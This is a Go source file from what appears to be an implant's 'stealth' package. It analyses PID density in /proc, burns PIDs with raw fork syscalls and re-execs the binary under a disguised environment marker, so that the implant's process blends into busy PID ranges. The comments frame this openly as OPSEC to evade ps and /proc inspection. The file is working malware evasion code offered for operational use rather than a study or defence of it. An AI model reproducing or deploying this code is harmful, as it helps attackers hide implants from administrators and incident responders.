package stealth

import (
	"os"
	"strconv"
	"syscall"
)

// Process ID Recycling Defense
//
// OPSEC rationale: If our PID sits in a sparse range (no neighboring processes),
// it stands out in `ps` output and /proc enumeration. By rapidly forking and
// exiting processes, we push the kernel's PID allocator forward, landing our
// operational PID in a busy range where many system processes live.
// This is distinct from PID manipulation in pid_manip.go — this operates
// on the HOST PID namespace to blend our host-visible PID.

// PIDDensityInfo holds information about how populated our PID neighborhood is.
type PIDDensityInfo struct {
	OurPID        int
	NeighborCount int     // PIDs within +/-50 of ours
	TotalProcs    int     // total process count
	Density       float64 // neighbor_count / 100 (percentage of nearby slots occupied)
	Verdict       string  // "good", "sparse", "isolated"
}

// AnalyzePIDDensity checks how well our PID blends with surrounding processes.
func AnalyzePIDDensity() *PIDDensityInfo {
	info := &PIDDensityInfo{
		OurPID: os.Getpid(),
	}

	entries, err := os.ReadDir("/proc")
	if err != nil {
		info.Verdict = "unknown"
		return info
	}

	radius := 50
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}
		info.TotalProcs++

		diff := pid - info.OurPID
		if diff < 0 {
			diff = -diff
		}
		if diff <= radius && pid != info.OurPID {
			info.NeighborCount++
		}
	}

	// Density: what percentage of the 100 surrounding PID slots are occupied
	info.Density = float64(info.NeighborCount) / 100.0

	switch {
	case info.NeighborCount >= 15:
		info.Verdict = "good"
	case info.NeighborCount >= 5:
		info.Verdict = "sparse"
	default:
		info.Verdict = "isolated"
	}

	return info
}

// BurnPIDs rapidly forks and exits to advance the kernel PID counter.
// This pushes the next allocated PID into a higher, busier range.
// Use this BEFORE re-execing the implant to control where it lands.
func BurnPIDs(count int) {
	for i := 0; i < count; i++ {
		pid, _, errno := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
		if errno != 0 {
			break
		}
		if pid == 0 {
			// Child: exit immediately via raw syscall to avoid Go runtime corruption.
			syscall.RawSyscall(syscall.SYS_EXIT, 0, 0, 0)
		}
		// Parent: reap child
		var ws syscall.WaitStatus
		syscall.Wait4(int(pid), &ws, 0, nil)
	}
}

// FindBusyPIDRange scans /proc to find PID ranges with high process density.
// Returns the starting PID of the densest 100-PID window.
func FindBusyPIDRange() int {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return 500
	}

	// Collect all PIDs
	var pids []int
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil || pid <= 1 {
			continue
		}
		pids = append(pids, pid)
	}

	if len(pids) == 0 {
		return 500
	}

	// Bucket PIDs in O(n) — each bucket covers 100 PIDs
	buckets := make(map[int]int)
	for _, pid := range pids {
		bucket := (pid / 100) * 100
		buckets[bucket]++
	}

	// Find the densest bucket
	bestStart := 0
	bestCount := 0
	for start, count := range buckets {
		if start >= 100 && count > bestCount {
			bestCount = count
			bestStart = start
		}
	}

	return bestStart
}

// BlendPID combines PID burning with density analysis to land in a good range.
// Returns true if we achieved good density after re-exec.
func BlendPID() bool {
	if os.Getenv("LC_TELEPHONE") == "1" {
		os.Unsetenv("LC_TELEPHONE") // clean up marker immediately
		return true
	}

	density := AnalyzePIDDensity()
	if density.Verdict == "good" {
		return true // already well-placed
	}

	// Find where the busy PIDs are
	busyRange := FindBusyPIDRange()
	currentPID := os.Getpid()

	// Calculate how many PIDs to burn to reach the busy range
	if busyRange > currentPID {
		burnCount := busyRange - currentPID
		if burnCount > 500 {
			burnCount = 500 // safety limit
		}
		BurnPIDs(burnCount)
	}

	// Re-exec to get a new PID in the target range
	exe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return false
	}

	env := os.Environ()
	env = append(env, "LC_TELEPHONE=1")
	syscall.Exec(exe, os.Args, env)

	return false // only reached if exec fails
}

// GetProcessDensityMap returns a map showing process count per 100-PID bucket.
// Useful for visualizing where processes cluster.
func GetProcessDensityMap() map[int]int {
	density := make(map[int]int)

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return density
	}

	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}
		bucket := (pid / 100) * 100
		density[bucket]++
	}

	return density
}
